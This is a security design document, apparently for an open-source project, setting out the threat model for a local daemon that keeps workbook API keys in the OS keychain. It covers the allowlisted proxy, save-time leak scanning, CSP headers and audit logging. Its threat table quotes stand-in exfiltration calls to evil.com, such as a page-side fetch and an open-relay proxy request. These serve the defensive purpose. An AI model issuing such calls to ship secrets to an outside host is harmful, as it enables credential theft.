# Workbook secrets — security model

Self-serve workbooks need API keys (fal.ai, ElevenLabs, OpenAI, your
internal services). The workbook file is a public artifact that gets
emailed, shared on USB sticks, served from CDNs. Both of those are
true at the same time, so the keys can't live in the file.

This document spells out exactly where keys live, who can read them,
how they reach the upstream service, and what attacks are blocked at
which layer. It's the threat model the daemon is built around.

## Threat model

Workbooks fail safely if and only if every one of these statements
stays true:

| Threat | Mitigation | Layer |
|---|---|---|
| Sharing a workbook leaks the user's keys | Keys never enter the file. Stored in OS keychain. | daemon |
| User opens a malicious workbook that steals keys from another workbook on the same daemon | Keychain entries namespaced by hash of the workbook's path. Token→path lookup gates every read. | daemon |
| Malicious code in the page exfiltrates keys via `fetch("https://evil.com")` | Browser-served `Content-Security-Policy: connect-src 'self'`. Page-side fetch wrapper as defense-in-depth. | both |
| Daemon is abused as an open relay (`wb.fetch --secret=FAL https://evil.com`) | Per-secret HTTPS host allowlist, declared in workbook config, baked into a meta tag the daemon parses. | daemon |
| Token leaked via Referer / browser history → CSRF on `/save` or `/secret/set` | `Origin` header check on every state-changing endpoint. | daemon |
| Agent embeds key value into composition HTML | Save-side substring scan against active secrets; refuses 409 on hit. | daemon |
| User accidentally `console.log`s the value while pasting into the modal | SDK patches `console.*` to scrub registered values via maximal-munch regex. | sdk |
| Plugin / skill captures the value via prototype monkeypatch | Page registry tracks the value only during the daemon round-trip; window of exposure is ~10ms. | sdk |
| Secret value appears in panic backtrace or `eprintln!("{:?}", v)` | `secrecy::SecretString` — no `Debug`/`Display` impl, `Drop` zeroizes the buffer. | daemon |
| User wants to confirm "is the right key set?" without re-exposing it | `wb.secret.preview` returns daemon-side mask `fa••••xyzy`. Browser never reads the raw value back. | both |
| User asks "what touched my keys?" | Audit log at `~/Library/Logs/workbooksd-audit.log`. Every read/write/proxy. Never values. | daemon |

## Storage at rest

Secrets live in the platform-native keychain via the `keyring` Rust
crate:

| OS | Backend |
|---|---|
| macOS | Keychain via `Security.framework` |
| Linux | Secret Service (`org.freedesktop.secrets` over D-Bus) |
| Windows | Credential Manager |

The keychain entry's account name is:

```
sh.workbooks.workbooksd / <16-char hex hash of canonical workbook path>:<secret-id>
```

Two consequences:

1. **Per-workbook isolation.** Two workbooks at different paths get
   different namespaces. Workbook B's daemon session token can't
   resolve A's secrets — token A was bound to path A; the keychain
   account is derived from path A; B's token derives a different
   account that doesn't exist for A's secret ids.
2. **Path-bound.** Move the file → secrets are abandoned (still in
   the keychain under the old hash; user can clear via Keychain
   Access). A "rebind on path change" UX is a follow-up; for now,
   we accept the tradeoff because the alternative — using the
   workbook's substrate `workbook_id` from the file's content — is
   spoofable by anyone who can craft a workbook file.

## Outbound proxy

The daemon exposes one HTTPS-egress endpoint:

```
POST /wb/<token>/proxy
{
  "url": "https://queue.fal.run/...",
  "method": "POST",
  "headers": { "Content-Type": "application/json" },
  "body": "{...}",
  "auth": {
    "headerName": "Authorization",
    "secretId": "FAL_API_KEY",
    "format": "Key {value}"
  }
}
```

The daemon:

1. Validates the request's `Origin` is the daemon's own (refuses cross-origin).
2. Looks up the token's bound path.
3. Parses URL — refuses non-`https://`.
4. Resolves the auth's `secretId` against the workbook's secrets policy. The policy comes from `<meta name="wb-secrets-policy" content="<base64-json>">` in the served HTML's outer shell. **Critically, policy is read from the file the daemon serves, not from the page.** That means a malicious skill running in the page can't override it.
5. If the policy declares this secret id, the URL's host MUST match one of the patterns. `*.fal.run` matches any subdomain of `fal.run`; bare `fal.run` matches itself. Anything else → `403`.
6. Reads the secret from the keychain (returns `404` if not set; this is the only way a 404 can come from `/proxy`).
7. Wraps the value in `SecretString`, formats per `auth.format`, sets the named header.
8. Forwards the request via `reqwest` with `rustls-tls`.
9. Returns the upstream response. Body is utf8 for text content-types, base64 for binary (so videos / images round-trip cleanly).
10. The `SecretString` drops at end-of-scope; the buffer is zeroized.

## Save scan (varlock-inspired)

`PUT /wb/<token>/save` accepts the new file body. Before writing it:

1. Daemon reads the keychain index for this workbook's path.
2. For each active secret id, it reads the value and substring-scans the body.
3. Any hit → refuse with `409 Conflict` and a clear error: "save refused: workbook content contains the value of secret 'FAL_API_KEY'."

This catches the agent-embedded-the-key class of bug, which the
file-as-database substrate model otherwise enables: the agent edits
HTML, an LLM can output any string into it, the user later shares
the file. Secrets shorter than 8 characters skip the scan to avoid
false positives.

The scan is `O(n × k)` substring search — fine for the typical
50 MB workbook × 5 secrets case. We'll move to Aho-Corasick if it
ever shows up in profiles.

## Page-side defenses (SDK)

`installLeakDefenses()` is called once at app boot (before any user
code runs). It does three things:

1. **Patches `console.*`** — every argument runs through a
   maximal-munch regex of currently-registered secret values.
   Matches become `[wb-redacted]`. Plain strings, JSON-encodable
   objects, and Error message fields all get scrubbed; non-
   serializable args pass through untouched (the registered-value
   match was the trigger, not the type).

2. **Wraps `globalThis.fetch`** — refuses cross-origin requests
   whose URL or headers contain a registered secret value. CSP's
   `connect-src 'self'` already blocks cross-origin requests at
   the browser layer; the JS wrapper provides clearer error
   messages for developers and resilience if CSP is somehow
   weakened.

3. **Hooks `window.onerror` + `unhandledrejection`** — scrubs
   Error message strings before they reach the developer console.

`wb.secret.set(id, value)` registers the value with the defense
system before posting to the daemon, and unregisters in `finally`.
The window where the value is held in browser memory shrinks to
~10ms.

## Page-side hardening (HTTP headers)

When the daemon serves the workbook HTML, it sets:

```
Content-Security-Policy: default-src 'self' data: blob:;
                         script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:;
                         style-src 'self' 'unsafe-inline';
                         font-src 'self' data:;
                         img-src 'self' data: blob: https:;
                         media-src 'self' data: blob:;
                         worker-src 'self' blob:;
                         frame-src 'self' data: blob:;
                         connect-src 'self';
                         object-src 'none';
                         base-uri 'self';
                         form-action 'self'
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
```

`connect-src 'self'` is the load-bearing line. It means every
`fetch()` from the page goes to the daemon's own origin —
`http://127.0.0.1:47119`. The only way to make outbound HTTPS is
through `wb.fetch` / `wb-fetch`, which routes via the daemon's
proxy, which enforces the host allowlist.

`Referrer-Policy: no-referrer` keeps the daemon URL (which contains
the session token) from leaking to any external host that a workbook
image / link goes to.

## Audit log

Every security-relevant action lands in
`~/Library/Logs/workbooksd-audit.log` (macOS) /
`~/.local/share/workbooksd/workbooksd-audit.log` (Linux):

```
2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.html action=secret-set       secret=FAL_API_KEY host=-
2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.html action=proxy            secret=FAL_API_KEY host=queue.fal.run
2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.html action=proxy-refused-domain secret=FAL_API_KEY host=evil.com
2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.html action=save-refused-leak secret=FAL_API_KEY host=-
```

Actions: `serve`, `secret-set`, `secret-delete`, `secret-preview`,
`proxy`, `proxy-noauth`, `proxy-refused-domain`,
`save`, `save-refused-leak`.

The log never includes secret values.

## What's NOT in the model (yet)

These are real concerns we have not yet addressed. Listing them so
the gap is visible.

- **Cross-origin sandboxed iframe per workbook.** Today every workbook on the same daemon shares the http://127.0.0.1:47119 origin. The keychain namespacing means they can't read each other's secrets, but they can read each other's `localStorage`, `IndexedDB`, etc. Phase 4: per-workbook unique subdomain or per-token random port for full origin isolation.
- **Multipart `wb-fetch` body.** Today the daemon proxy accepts utf8 / base64 bodies; `multipart/form-data` for ElevenLabs voice cloning / dubbing isn't wired through. Workaround: do those flows in the service's web UI, drop the result into the workbook's Assets panel.
- **Build-time scan against well-known prefixes.** The daemon catches `agent embedded the key` at save time; the cli could also catch `developer accidentally committed a key into source` at `workbook build` time by scanning for `sk-`, `fal_`, `xi-` patterns in the bundle. On the roadmap.
- **TLS pinning for known providers.** A user with a malicious local CA could MITM the daemon's outbound HTTPS. Mitigation: `rustls-tls` doesn't trust the OS root store by default; we use webpki-roots. Not pinning specific endpoints yet.

## Auditing

The whole secrets implementation lives in:

- `packages/workbooksd/src/main.rs` — daemon endpoints, keychain, proxy, save scan, CSP headers
- `packages/runtime/src/storage/secret.ts` — browser-side `wb.secret` + `wb.fetch` SDK
- `packages/runtime/src/storage/leak-defense.ts` — console / fetch / error patching
- `packages/workbook-cli/src/util/config.mjs` — `secrets:` config schema
- `packages/workbook-cli/src/plugins/workbookInline.mjs` — meta-tag emission

Auth context is the keychain library + `secrecy` + `reqwest` with
rustls. Total Rust dependency surface for the secrets path: 5
crates.
